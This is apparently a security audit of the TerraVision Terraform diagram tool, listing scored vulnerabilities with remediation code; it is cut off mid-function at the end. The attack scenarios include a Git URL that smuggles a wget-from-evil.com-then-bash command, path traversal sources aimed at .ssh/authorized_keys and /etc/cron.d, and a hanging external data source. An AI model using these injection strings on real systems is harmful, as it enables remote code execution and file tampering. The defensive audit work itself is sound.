# TerraVision Security Audit

## Executive Summary

This security audit identifies vulnerabilities and security risks in TerraVision v0.8 beyond those already documented in CODEREVIEW.md. The tool processes untrusted Terraform code and Git repositories, executes external commands (terraform, git, dot), and handles sensitive credential data, creating a significant attack surface.

### Overall Security Posture
**Risk Level:** MEDIUM-HIGH

The application demonstrates several critical security concerns that could allow:
- Remote code execution through malicious Terraform modules
- Credential exposure through environment variables and logs
- Path traversal attacks via Git URLs
- Supply chain attacks through unvalidated dependencies
- Information disclosure through exported diagrams and debug output

### Vulnerability Summary
- **Critical Vulnerabilities (CVSS 9.0-10.0):** 2
- **High Risk Vulnerabilities (CVSS 7.0-8.9):** 5
- **Medium Risk Vulnerabilities (CVSS 4.0-6.9):** 7
- **Low Risk / Informational (CVSS 0.1-3.9):** 4

### Immediate Actions Required
1. Implement Git URL validation and sanitization (SEC-CRIT-001)
2. Add TFE_TOKEN sanitization in logs and error output (SEC-CRIT-002)
3. Implement subprocess timeout protection (SEC-HIGH-001)
4. Add certificate verification for HTTPS requests (SEC-HIGH-002)
5. Update vulnerable dependencies (SEC-HIGH-005)

---

## Critical Vulnerabilities (CVSS 9.0-10.0)

### SEC-CRIT-001: Git URL Injection via Unvalidated Repository URLs

**Location:** modules/gitlibs.py:464-469, 276-277  
**CVSS Score:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Description:**  
The `clone_from()` function and registry API requests do not validate or sanitize Git URLs before passing them to GitPython and requests libraries. An attacker can supply malicious URLs through the `--source` CLI parameter or Terraform module sources.

**Attack Scenario:**
```python
# Attacker provides malicious Git URL with command injection
terravision draw --source "git::https://evil.com/repo$(whoami).git"

# Or via Terraform module source
module "malicious" {
  source = "git::https://attacker.com/repo?ref=main;wget+http://evil.com/shell.sh+-O+/tmp/shell.sh;bash+/tmp/shell.sh"
}
```

**Impact:**
- **Confidentiality:** HIGH - Attacker can read local files, environment variables, credentials
- **Integrity:** HIGH - Arbitrary code execution on the system
- **Availability:** HIGH - System compromise, denial of service

**Remediation:**
```python
# modules/gitlibs.py
import urllib.parse
from typing import Optional

ALLOWED_PROTOCOLS = ['https', 'ssh', 'git']
ALLOWED_DOMAINS = [
    'github.com',
    'gitlab.com',
    'bitbucket.org',
    # Add approved enterprise Git servers
]

def validate_git_url(url: str) -> Optional[str]:
    """Validate and sanitize Git URLs.
    
    Returns sanitized URL or None if validation fails.
    """
    try:
        parsed = urllib.parse.urlparse(url)
        
        # Validate protocol
        if parsed.scheme not in ALLOWED_PROTOCOLS:
            raise ValueError(f"Unsupported protocol: {parsed.scheme}")
        
        # Validate domain (optional - remove for private repos)
        if parsed.netloc and parsed.netloc not in ALLOWED_DOMAINS:
            # Log warning for enterprise deployments
            click.echo(click.style(
                f"WARNING: Cloning from non-standard domain: {parsed.netloc}",
                fg="yellow"
            ))
        
        # Prevent command injection in URL parameters
        if any(char in url for char in [';', '|', '&', '$', '`', '>', '<']):
            raise ValueError("Invalid characters in URL")
        
        # Sanitize and rebuild URL
        sanitized = urllib.parse.urlunparse((
            parsed.scheme,
            parsed.netloc,
            parsed.path,
            parsed.params,
            parsed.query,
            ''  # Remove fragment
        ))
        
        return sanitized
    except Exception as e:
        click.echo(click.style(
            f"ERROR: Invalid Git URL: {e}",
            fg="red", bold=True
        ))
        return None

# Apply validation before clone
def _clone_full_repo(githubURL: str, subfolder: str, tag: str, codepath: str) -> str:
    # Validate URL
    sanitized_url = validate_git_url(githubURL)
    if not sanitized_url:
        raise ValueError("Git URL validation failed")
    
    # Validate tag/branch (prevent injection)
    if tag and not re.match(r'^[a-zA-Z0-9._/-]+$', tag):
        raise ValueError("Invalid characters in git tag/branch")
    
    # Continue with validated inputs
    git.Repo.clone_from(
        sanitized_url,
        str(codepath),
        multi_options=['--branch', tag] if tag else [],
        progress=CloneProgress(),
    )
```

**Priority:** IMMEDIATE - Implement before v0.9 release

---

### SEC-CRIT-002: Credential Exposure in Logs and Error Messages

**Location:** modules/gitlibs.py:256, 283; modules/tfwrapper.py:91; terravision.py:27  
**CVSS Score:** 9.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H)

**Description:**  
TFE_TOKEN environment variable and AWS credentials are exposed in error messages, debug output, and potentially in exported JSON. The application also logs subprocess stderr which may contain sensitive data from Terraform operations.

**Attack Scenario:**
```python
# TFE_TOKEN exposed in error messages
# modules/gitlibs.py:256
headers = {"Authorization": "bearer " + os.environ["TFE_TOKEN"]}
# If request fails, error message includes full context

# Debug mode exposes all subprocess output including credentials
terravision draw --source ./terraform --debug
# Output may include: AWS keys, database passwords, API tokens from Terraform output

# Exported JSON contains metadata that may have sensitive values
terravision graphdata --source ./terraform --outfile graph.json
# graph.json may contain connection strings, secrets from Terraform variables
```

**Impact:**
- **Confidentiality:** HIGH - Credentials and secrets leaked
- **Integrity:** NONE
- **Availability:** HIGH - Credential compromise enables further attacks

**Remediation:**
```python
# Create sensitive data sanitizer
import re

SENSITIVE_PATTERNS = {
    'AWS_ACCESS_KEY': r'(?i)(aws_access_key_id|aws_access_key)\s*=\s*[A-Z0-9]{20}',
    'AWS_SECRET_KEY': r'(?i)(aws_secret_access_key|aws_secret_key)\s*=\s*[A-Za-z0-9/+=]{40}',
    'BEARER_TOKEN': r'(bearer|token)\s+[A-Za-z0-9._-]{20,}',
    'PASSWORD': r'(?i)(password|passwd)\s*[:=]\s*[^\s]+',
    'API_KEY': r'(?i)(api[_-]?key|apikey)\s*[:=]\s*[^\s]+',
    'CONNECTION_STRING': r'(?i)(mongodb|postgres|mysql)://[^\s]+',
}

def sanitize_sensitive_data(text: str) -> str:
    """Remove sensitive data from text output.
    
    Args:
        text: Text potentially containing sensitive data
        
    Returns:
        Sanitized text with secrets replaced
    """
    sanitized = text
    for pattern_name, pattern in SENSITIVE_PATTERNS.items():
        sanitized = re.sub(pattern, f'[{pattern_name}_REDACTED]', sanitized)
    return sanitized

# Apply to all error messages and logs
# modules/gitlibs.py
try:
    r = requests.get(domain + gitaddress, headers=headers)
    githubURL = r.json()["source"]
except Exception as e:
    # Sanitize error message
    error_msg = sanitize_sensitive_data(str(e))
    click.echo(click.style(
        f"\nERROR: Cannot connect to Git Repo: {error_msg}",
        fg="red", bold=True
    ))
    exit()

# Sanitize subprocess stderr
# modules/tfwrapper.py
if not debug and result.stderr:
    sanitized_stderr = sanitize_sensitive_data(result.stderr)
    click.echo(click.style(f"Details: {sanitized_stderr}", fg="red"))

# Add flag to prevent sensitive data in JSON export
def export_tfdata(tfdata: dict, sanitize: bool = True):
    """Export tfdata with optional sanitization."""
    if sanitize:
        # Remove sensitive keys from metadata
        sensitive_keys = ['password', 'secret', 'token', 'key', 'connection_string']
        for node, metadata in tfdata.get('meta_data', {}).items():
            for key in list(metadata.keys()):
                if any(s in key.lower() for s in sensitive_keys):
                    metadata[key] = '[REDACTED]'
```

**Priority:** IMMEDIATE - Critical for CI/CD usage where logs are stored

---

## High Risk Vulnerabilities (CVSS 7.0-8.9)

### SEC-HIGH-001: Command Injection via Subprocess Without Timeout

**Location:** modules/tfwrapper.py:77-92, 105-194; modules/drawing.py:523-534  
**CVSS Score:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Description:**  
Subprocess calls to terraform, git, and gvpr lack timeout protection. Malicious Terraform code can cause infinite hangs through provider plugins or data sources, enabling denial of service.

**Attack Scenario:**
```terraform
# Malicious data source that never returns
data "external" "infinite" {
  program = ["bash", "-c", "while true; do sleep 1; done"]
}

# Or provider plugin with infinite loop
provider "malicious" {
  # Plugin hangs during init
}
```

**Impact:**
- **Confidentiality:** HIGH - Resource exhaustion may expose other processes
- **Integrity:** HIGH - System becomes unavailable
- **Availability:** NONE - Direct DoS

**Remediation:**
```python
# Add timeout to all subprocess calls
DEFAULT_TIMEOUT = 300  # 5 minutes
INIT_TIMEOUT = 600     # 10 minutes for terraform init (downloads providers)

# modules/tfwrapper.py
try:
    result = subprocess.run(
        ["terraform", "init", "--upgrade", "-reconfigure"],
        capture_output=not debug,
        text=True,
        timeout=INIT_TIMEOUT  # Add timeout
    )
except subprocess.TimeoutExpired:
    click.echo(click.style(
        f"\nERROR: Terraform init timed out after {INIT_TIMEOUT}s. "
        f"This may indicate a hanging provider download or malicious module.",
        fg="red", bold=True
    ))
    sys.exit(1)

# For terraform plan with potentially malicious data sources
try:
    result = subprocess.run(
        ["terraform", "plan", "-out=tfplan"] + varfile_args,
        capture_output=not debug,
        text=True,
        timeout=DEFAULT_TIMEOUT
    )
except subprocess.TimeoutExpired:
    click.echo(click.style(
        f"\nERROR: Terraform plan timed out. Check for infinite loops in data sources.",
        fg="red", bold=True
    ))
    sys.exit(1)
```

**Priority:** HIGH - Implement in v0.9

---

### SEC-HIGH-002: Insufficient HTTPS Certificate Validation

**Location:** modules/gitlibs.py:276-277  
**CVSS Score:** 7.4 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N)

**Description:**  
The requests library calls to Terraform Registry and TFE servers do not explicitly verify SSL certificates, potentially allowing man-in-the-middle attacks.

**Attack Scenario:**
```python
# Attacker intercepts registry API request
# modules/gitlibs.py:276
r = requests.get(domain + gitaddress, headers=headers)
# No verify=True parameter - may accept invalid certificates

# MITM attacker returns malicious module source URL
# User downloads and executes attacker's Terraform module
```

**Impact:**
- **Confidentiality:** HIGH - TFE_TOKEN exposed to MITM
- **Integrity:** HIGH - Malicious module source injected
- **Availability:** NONE

**Remediation:**
```python
# modules/gitlibs.py
import certifi

# Configure requests session with certificate validation
session = requests.Session()
session.verify = certifi.where()  # Use bundled CA certificates

# Add timeout to prevent hanging
REQUEST_TIMEOUT = 30

try:
    r = session.get(
        domain + gitaddress,
        headers=headers,
        timeout=REQUEST_TIMEOUT,
        verify=True  # Explicit certificate validation
    )
    r.raise_for_status()  # Raise exception for HTTP errors
    githubURL = r.json()["source"]
except requests.exceptions.SSLError as e:
    click.echo(click.style(
        f"\nERROR: SSL certificate validation failed: {e}",
        fg="red", bold=True
    ))
    exit(1)
except requests.exceptions.Timeout:
    click.echo(click.style(
        f"\nERROR: Request to registry timed out after {REQUEST_TIMEOUT}s",
        fg="red", bold=True
    ))
    exit(1)
except requests.exceptions.RequestException as e:
    click.echo(click.style(
        f"\nERROR: Registry request failed: {e}",
        fg="red", bold=True
    ))
    exit(1)
```

**Priority:** HIGH - Critical for TFE users

---

### SEC-HIGH-003: Path Traversal in Git Clone Operations

**Location:** modules/gitlibs.py:297-330, 452-455  
**CVSS Score:** 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N)

**Description:**  
The subfolder parameter from Git URLs is not validated, allowing path traversal to write files outside the intended directory.

**Attack Scenario:**
```python
# Attacker provides URL with path traversal
terravision draw --source "git::https://github.com/attacker/repo.git//../../.ssh/authorized_keys"

# Or in Terraform module
module "malicious" {
  source = "git::https://github.com/attacker/evil.git//../../../../etc/cron.d/backdoor"
}

# Clone operation writes files to unintended locations
```

**Impact:**
- **Confidentiality:** NONE
- **Integrity:** HIGH - Arbitrary file write
- **Availability:** NONE

**Remediation:**
```python
# modules/gitlibs.py
import os.path

def validate_subfolder(subfolder: str, base_path: str) -> str:
    """Validate subfolder path to prevent traversal.
    
    Args:
        subfolder: Relative path within repository
        base_path: Base directory for clone
        
    Returns:
        Validated absolute path
        
    Raises:
        ValueError: If path traversal detected
    """
    if not subfolder:
        return base_path
    
    # Remove leading/trailing slashes
    subfolder = subfolder.strip('/')
    
    # Reject path traversal attempts
    if '..' in subfolder or subfolder.startswith('/'):
        raise ValueError(f"Invalid subfolder path: {subfolder}")
    
    # Build and validate absolute path
    abs_path = os.path.abspath(os.path.join(base_path, subfolder))
    
    # Ensure result is within base_path
    if not abs_path.startswith(os.path.abspath(base_path)):
        raise ValueError(f"Path traversal detected: {subfolder}")
    
    return abs_path

# Apply validation
def _clone_full_repo(githubURL: str, subfolder: str, tag: str, codepath: str) -> str:
    # ... existing clone code ...
    
    # Validate subfolder before use
    try:
        validated_path = validate_subfolder(subfolder, codepath)
        return subfolder  # Return original relative path
    except ValueError as e:
        click.echo(click.style(
            f"\nERROR: {e}",
            fg="red", bold=True
        ))
        exit(1)
```

**Priority:** HIGH - Implement in v0.9

---

### SEC-HIGH-004: Uncontrolled Resource Consumption in Graph Processing

**Location:** modules/graphmaker.py:302-359, 548-622; modules/interpreter.py:144-169  
**CVSS Score:** 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)

**Description:**  
Graph processing algorithms lack resource limits. Malicious Terraform with deeply nested modules or circular dependencies can cause memory exhaustion or infinite loops.

**Attack Scenario:**
```terraform
# Deeply nested module structure
module "level1" {
  source = "./module"
  count  = 1000
}

# Each module references 1000 resources
# Total nodes: 1,000,000 causing OOM

# Or circular module dependencies
module "a" {
  source = "git::https://github.com/attacker/module-a"
}

# module-a references module-b, module-b references module-a
# Causes infinite loop in variable resolution
```

**Impact:**
- **Confidentiality:** NONE
- **Integrity:** NONE
- **Availability:** HIGH - Memory exhaustion, CPU starvation

**Remediation:**
```python
# Add resource limits
MAX_NODES = 10000
MAX_ITERATIONS = 100
MAX_DEPTH = 50

# modules/graphmaker.py
def consolidate_nodes(tfdata: Dict[str, Any]) -> Dict[str, Any]:
    """Consolidate nodes with resource limit."""
    node_count = len(tfdata.get("graphdict", {}))
    
    if node_count > MAX_NODES:
        click.echo(click.style(
            f"\nWARNING: Graph contains {node_count} nodes (max {MAX_NODES}). "
            f"This may cause performance issues or memory exhaustion.",
            fg="yellow", bold=True
        ))
        # Option: abort or use simplified mode
        return tfdata
    
    # ... existing consolidation logic ...

# modules/interpreter.py
def resolve_all_variables(tfdata: dict, debug: bool = False, already_processed: bool = False):
    """Resolve variables with iteration limit."""
    iteration = 0
    max_iterations = MAX_ITERATIONS
    
    while iteration < max_iterations:
        iteration += 1
        # ... existing resolution logic ...
        
        # Check for convergence
        if not changes_made:
            break
    
    if iteration >= max_iterations:
        click.echo(click.style(
            f"\nWARNING: Variable resolution did not converge after {max_iterations} iterations. "
            f"This may indicate circular dependencies.",
            fg="yellow", bold=True
        ))
    
    return tfdata

# Add memory monitoring (optional)
import resource

def check_memory_usage():
    """Monitor memory usage and abort if exceeding limit."""
    max_memory_mb = 2048  # 2GB limit
    usage_mb = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss / 1024
    
    if usage_mb > max_memory_mb:
        raise MemoryError(
            f"Memory usage ({usage_mb:.0f}MB) exceeds limit ({max_memory_mb}MB)"
        )
```

**Priority:** HIGH - Important for CI/CD stability

---

### SEC-HIGH-005: Vulnerable Dependencies

**Location:** requirements.txt, pyproject.toml  
**CVSS Score:** 7.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L)

**Description:**  
Several dependencies have known vulnerabilities:
- `GitPython==3.1.31` - CVE-2023-40590 (Arbitrary Code Execution)
- `requests==2.28.2` - Should upgrade to 2.31.0+ for security fixes
- `PyYAML==6.0` - Should upgrade to 6.0.1+ for CVE-2020-14343
- `ipaddr==2.2.0` - Deprecated, should use `ipaddress` (stdlib)
- `debugpy==1.5.1` - Should upgrade to 1.6.7+ for security fixes

**Impact:**
- **Confidentiality:** LOW - Potential information disclosure
- **Integrity:** LOW - Potential code execution via Git operations
- **Availability:** LOW - DoS via malformed YAML/requests

**Remediation:**
```toml
# pyproject.toml - Update to secure versions
[tool.poetry.dependencies]
GitPython = "3.1.40"  # Latest secure version
requests = "2.31.0"
PyYAML = "6.0.1"
# Remove ipaddr, use standard library ipaddress instead
debugpy = "1.8.0"
click = "8.1.7"
graphviz = "0.20.3"
tqdm = "4.66.1"
python-hcl2 = "4.3.2"
typing-extensions = "4.9.0"
ollama = "0.6.0"
python = ">=3.9,<3.12"

# Also update in requirements.txt
```

**Priority:** HIGH - Apply before v1.0 release

---

## Medium Risk Vulnerabilities (CVSS 4.0-6.9)

### SEC-MED-001: Insecure Temporary File Creation

**Location:** modules/tfwrapper.py:26; modules/gitlibs.py  
**CVSS Score:** 5.9 (CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L)

**Description:**  
Temporary directories are created with predictable names in shared temp directory without setting secure permissions.

**Remediation:**
```python
# modules/tfwrapper.py
import tempfile
import os

# Create temp directory with restricted permissions
temp_dir = tempfile.TemporaryDirectory(
    dir=tempfile.gettempdir(),
    prefix='terravision_'
)

# Set restrictive permissions (owner only)
os.chmod(temp_dir.name, 0o700)

# For temporary files, use NamedTemporaryFile with delete=False if needed
with tempfile.NamedTemporaryFile(
    mode='w',
    suffix='.json',
    delete=False,
    dir=temp_dir.name
) as tf:
    tf.write(json_data)
    temp_file_path = tf.name

os.chmod(temp_file_path, 0o600)  # Owner read/write only
```

**Priority:** MEDIUM - Implement in v1.0

---

### SEC-MED-002: Missing Input Validation for Terraform Workspace Names

**Location:** terravision.py:236, modules/tfwrapper.py:105-125  
**CVSS Score:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N)

**Description:**  
Workspace names from user input are not validated before being passed to subprocess commands.

**Remediation:**
```python
def validate_workspace_name(workspace: str) -> bool:
    """Validate Terraform workspace name.
    
    Args:
        workspace: Workspace name to validate
        
    Returns:
        True if valid, raises ValueError otherwise
    """
    # Terraform workspace naming rules
    if not re.match(r'^[a-zA-Z0-9_-]+$', workspace):
        raise ValueError(
            f"Invalid workspace name: {workspace}. "
            "Must contain only letters, numbers, hyphens, and underscores."
        )
    
    if len(workspace) > 90:
        raise ValueError("Workspace name too long (max 90 characters)")
    
    return True

# Apply in terravision.py
@cli.command()
@click.option("--workspace", default="default")
def draw(workspace, ...):
    try:
        validate_workspace_name(workspace)
    except ValueError as e:
        click.echo(click.style(f"\nERROR: {e}", fg="red", bold=True))
        sys.exit(1)
    # ... continue
```

**Priority:** MEDIUM - Implement in v1.0

---

### SEC-MED-003: Information Disclosure in Debug Mode

**Location:** terravision.py:86-87, modules/helpers.py:1064-1074  
**CVSS Score:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Description:**  
Debug mode exports full tfdata including potentially sensitive metadata to `tfdata.json` in current directory.

**Remediation:**
```python
# modules/helpers.py
def export_tfdata(tfdata: dict, sanitize: bool = True):
    """Export tfdata with optional sanitization for security.
    
    Args:
        tfdata: Terraform data dictionary
        sanitize: Whether to remove sensitive fields
    """
    export_data = copy.deepcopy(tfdata)
    
    if sanitize:
        # Remove sensitive metadata keys
        sensitive_keys = [
            'password', 'secret', 'token', 'key', 'api_key',
            'connection_string', 'credentials', 'private_key'
        ]
        
        for node, metadata in export_data.get('meta_data', {}).items():
            for key in list(metadata.keys()):
                if any(s in key.lower() for s in sensitive_keys):
                    metadata[key] = '[REDACTED_FOR_SECURITY]'
        
        # Add warning to exported file
        export_data['_security_notice'] = (
            "This export has been sanitized to remove sensitive data. "
            "Do not share this file publicly without review."
        )
    
    with open("tfdata.json", "w") as f:
        json.dump(export_data, f, indent=4)
    
    click.echo(
        click.style(
            "\nDEBUG: Exported tfdata to tfdata.json (sanitized)",
            fg="yellow"
        )
    )
```

**Priority:** MEDIUM - Implement in v1.0

---

### SEC-MED-004: Race Condition in Module Cache

**Location:** modules/gitlibs.py:268-272, 415-428  
**CVSS Score:** 4.7 (CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:N)

**Description:**  
Module cache directory checks and operations are not atomic, creating TOCTOU (Time-of-Check-Time-of-Use) vulnerability.

**Remediation:**
```python
import fcntl
import contextlib

@contextlib.contextmanager
def file_lock(lock_file_path):
    """Context manager for file-based locking."""
    lock_file = open(lock_file_path, 'w')
    try:
        fcntl.flock(lock_file, fcntl.LOCK_EX)
        yield
    finally:
        fcntl.flock(lock_file, fcntl.LOCK_UN)
        lock_file.close()

def _handle_cached_module(codepath, tempdir, module, reponame):
    """Handle cached module with file locking."""
    lock_path = os.path.join(MODULE_DIR, f".{reponame}.lock")
    
    with file_lock(lock_path):
        # Check cache inside lock
        if os.path.exists(codepath):
            # Verify cache integrity
            if not os.path.isdir(codepath):
                click.echo(f"WARNING: Cache corrupted for {reponame}, re-downloading")
                os.remove(codepath)
                return None
            
            # Safe to use cached module
            temp_module_path = os.path.join(tempdir, f";{module};{reponame}")
            if not os.path.exists(temp_module_path):
                shutil.copytree(codepath, temp_module_path)
            
            return codepath
        
        return None
```

**Priority:** MEDIUM - Low exploitability, but good practice

---

### SEC-MED-005: Insufficient Validation of HCL2 Input

**Location:** modules/fileparser.py:200, 213, 333-385; modules/interpreter.py:787  
**CVSS Score:** 5.9 (CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L)

**Description:**  
HCL2 parsing does not validate structure depth or complexity, allowing malicious Terraform to cause parser errors or resource exhaustion.

**Remediation:**
```python
# modules/fileparser.py
MAX_HCL_DEPTH = 20
MAX_HCL_SIZE = 10 * 1024 * 1024  # 10MB

def safe_hcl_load(file_path: str) -> dict:
    """Safely load HCL file with size and complexity limits.
    
    Args:
        file_path: Path to HCL file
        
    Returns:
        Parsed HCL dictionary
        
    Raises:
        ValueError: If file is too large or complex
    """
    # Check file size
    file_size = os.path.getsize(file_path)
    if file_size > MAX_HCL_SIZE:
        raise ValueError(
            f"HCL file too large: {file_size} bytes (max {MAX_HCL_SIZE})"
        )
    
    try:
        with open(file_path, "r", encoding="utf-8") as f:
            content = f.read()
        
        # Parse with timeout protection
        import signal
        
        def timeout_handler(signum, frame):
            raise TimeoutError("HCL parsing timed out")
        
        signal.signal(signal.SIGALRM, timeout_handler)
        signal.alarm(30)  # 30 second timeout
        
        try:
            parsed = hcl2.load(content)
        finally:
            signal.alarm(0)  # Cancel alarm
        
        # Validate depth
        depth = get_dict_depth(parsed)
        if depth > MAX_HCL_DEPTH:
            raise ValueError(f"HCL structure too deep: {depth} (max {MAX_HCL_DEPTH})")
        
        return parsed
        
    except Exception as e:
        click.echo(click.style(
            f"ERROR: Failed to parse {file_path}: {e}",
            fg="red", bold=True
        ))
        raise

def get_dict_depth(d, current_depth=0):
    """Recursively calculate maximum depth of nested dictionaries."""
    if not isinstance(d, dict):
        return current_depth
    
    if not d:
        return current_depth + 1
    
    return max(get_dict_depth(v, current_depth + 1) for v in d.values())
```

**Priority:** MEDIUM - Implement in v1.0

---

### SEC-MED-006: Missing HTTPS Redirect Validation

**Location:** modules/gitlibs.py:276-277  
**CVSS Score:** 4.8 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N)

**Description:**  
HTTP requests do not validate redirect targets, allowing potential redirect to malicious domains.

**Remediation:**
```python
# Configure requests with redirect validation
class SafeRedirectSession(requests.Session):
    """Session with validated redirects."""
    
    def rebuild_auth(self, prepared_request, response):
        """Override to validate redirect targets."""
        # Get redirect URL
        redirect_url = response.headers.get('Location')
        
        if redirect_url:
            # Validate redirect is HTTPS
            parsed = urllib.parse.urlparse(redirect_url)
            if parsed.scheme != 'https':
                raise requests.exceptions.RequestException(
                    f"Redirect to non-HTTPS URL blocked: {redirect_url}"
                )
            
            # Validate domain
            if not any(allowed in parsed.netloc for allowed in ALLOWED_DOMAINS):
                raise requests.exceptions.RequestException(
                    f"Redirect to untrusted domain blocked: {parsed.netloc}"
                )
        
        return super().rebuild_auth(prepared_request, response)

# Use in gitlibs.py
session = SafeRedirectSession()
session.max_redirects = 3  # Limit redirect chains
```

**Priority:** MEDIUM - Implement in v1.0

---

### SEC-MED-007: Symlink Attack in File Operations

**Location:** modules/fileparser.py:305-320; modules/gitlibs.py:424-428  
**CVSS Score:** 5.3 (CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L)

**Description:**  
File operations do not check for symlinks, allowing attackers to trick the tool into reading/writing arbitrary files via symlink replacement.

**Remediation:**
```python
import stat

def safe_file_operation(file_path: str, operation: str = 'read'):
    """Validate file before operation to prevent symlink attacks.
    
    Args:
        file_path: Path to file
        operation: 'read' or 'write'
        
    Raises:
        ValueError: If symlink detected or invalid permissions
    """
    # Check if path exists
    if not os.path.exists(file_path):
        if operation == 'read':
            raise FileNotFoundError(f"File not found: {file_path}")
        return  # OK for write operations
    
    # Get file stats without following symlinks
    file_stat = os.lstat(file_path)
    
    # Reject symlinks
    if stat.S_ISLNK(file_stat.st_mode):
        raise ValueError(f"Symlink detected, operation blocked: {file_path}")
    
    # Verify it's a regular file
    if not stat.S_ISREG(file_stat.st_mode) and operation == 'read':
        raise ValueError(f"Not a regular file: {file_path}")
    
    return True

# Apply before file reads
# modules/fileparser.py
def find_tf_files(directory: str, mod: str = "false") -> List[str]:
    """Find Terraform files with symlink protection."""
    tf_files = []
    
    for root, dirs, files in os.walk(directory):
        # Skip symlinked directories
        dirs[:] = [d for d in dirs if not os.path.islink(os.path.join(root, d))]
        
        for file in files:
            if file.endswith('.tf'):
                file_path = os.path.join(root, file)
                try:
                    safe_file_operation(file_path, 'read')
                    tf_files.append(file_path)
                except ValueError as e:
                    click.echo(click.style(
                        f"WARNING: Skipping {file_path}: {e}",
                        fg="yellow"
                    ))
    
    return tf_files
```

**Priority:** MEDIUM - Implement in v1.0

---

## Low Risk / Informational (CVSS 0.1-3.9)

### SEC-LOW-001: Insufficient Logging of Security Events

**Location:** All modules  
**CVSS Score:** 3.1 (CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N)

**Description:**  
Security-relevant events (failed authentication, suspicious inputs, resource limits) are not logged for audit trails.

**Remediation:**
```python
import logging
from logging.handlers import RotatingFileHandler

# Create security audit logger
def setup_security_logger():
    """Initialize security event logger."""
    logger = logging.getLogger('terravision.security')
    logger.setLevel(logging.INFO)
    
    # Log to file with rotation
    log_dir = os.path.join(Path.home(), '.terravision', 'logs')
    os.makedirs(log_dir, exist_ok=True)
    
    handler = RotatingFileHandler(
        os.path.join(log_dir, 'security.log'),
        maxBytes=10*1024*1024,  # 10MB
        backupCount=5
    )
    
    formatter = logging.Formatter(
        '%(asctime)s - %(levelname)s - %(message)s'
    )
    handler.setFormatter(formatter)
    logger.addHandler(handler)
    
    return logger

security_log = setup_security_logger()

# Log security events
def log_security_event(event_type: str, details: dict):
    """Log security-relevant event.
    
    Args:
        event_type: Type of event (auth_failure, input_validation, etc.)
        details: Event details (sanitized)
    """
    # Sanitize details to prevent log injection
    sanitized = {
        k: str(v).replace('\n', ' ').replace('\r', '')
        for k, v in details.items()
    }
    
    security_log.info(f"{event_type}: {sanitized}")

# Use throughout codebase
# Example in gitlibs.py
if "TFE_TOKEN" not in os.environ:
    log_security_event('auth_failure', {
        'reason': 'missing_tfe_token',
        'source': sourceURL
    })
    # ... existing error handling

# Example for suspicious inputs
try:
    validate_git_url(url)
except ValueError as e:
    log_security_event('input_validation_failure', {
        'input_type': 'git_url',
        'error': str(e),
        'url': url[:50]  # Log partial URL only
    })
```

**Priority:** LOW - Good practice for v1.1

---

### SEC-LOW-002: Missing Security Headers in Future Web Interface

**Location:** N/A (Future consideration)  
**CVSS Score:** 2.6 (CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N)

**Description:**  
If TerraVision adds a web UI in the future, ensure security headers are configured.

**Remediation:**
Document for future development:
- Content-Security-Policy
- X-Frame-Options: DENY
- X-Content-Type-Options: nosniff
- Strict-Transport-Security
- Referrer-Policy: no-referrer

**Priority:** INFORMATIONAL - Note for future releases

---

### SEC-LOW-003: Lack of Input Size Limits for CLI Arguments

**Location:** terravision.py:224-261, 283-322  
**CVSS Score:** 3.3 (CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L)

**Description:**  
No size limits on CLI input parameters (source, outfile, varfile) could allow resource exhaustion via extremely long arguments.

**Remediation:**
```python
# Add validation
MAX_ARG_LENGTH = 4096

def validate_cli_argument(arg_name: str, arg_value: str, max_length: int = MAX_ARG_LENGTH):
    """Validate CLI argument length.
    
    Args:
        arg_name: Name of argument
        arg_value: Value to validate
        max_length: Maximum allowed length
        
    Raises:
        ValueError: If argument too long
    """
    if len(arg_value) > max_length:
        raise ValueError(
            f"{arg_name} too long: {len(arg_value)} chars (max {max_length})"
        )

# Apply in click handlers
@cli.command()
@click.option("--source", multiple=True, default=["."])
def draw(source, ...):
    for s in source:
        try:
            validate_cli_argument("source", s)
        except ValueError as e:
            click.echo(click.style(f"\nERROR: {e}", fg="red", bold=True))
            sys.exit(1)
    # ... continue
```

**Priority:** LOW - Edge case, implement if convenient

---

### SEC-LOW-004: Potential for Diagram Content Injection

**Location:** modules/drawing.py; modules/annotations.py  
**CVSS Score:** 2.3 (CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:U/C:L/I:N/A:N)

**Description:**  
User-provided annotation labels are not sanitized before inclusion in diagrams, potentially allowing injection of misleading content.

**Remediation:**
```python
# modules/annotations.py
def sanitize_label(label: str) -> str:
    """Sanitize user-provided labels for diagram inclusion.
    
    Args:
        label: User-provided label text
        
    Returns:
        Sanitized label safe for diagram rendering
    """
    # Remove control characters
    sanitized = ''.join(char for char in label if char.isprintable())
    
    # Limit length
    max_label_length = 200
    if len(sanitized) > max_label_length:
        sanitized = sanitized[:max_label_length] + '...'
    
    # Escape special characters for Graphviz
    sanitized = sanitized.replace('"', '\\"')
    sanitized = sanitized.replace('<', '&lt;')
    sanitized = sanitized.replace('>', '&gt;')
    
    return sanitized

# Apply to user annotations
def modify_metadata(tfdata, annotation_node, annotations):
    """Modify metadata with sanitized labels."""
    if "label" in annotations:
        label = annotations["label"]
        sanitized_label = sanitize_label(label)
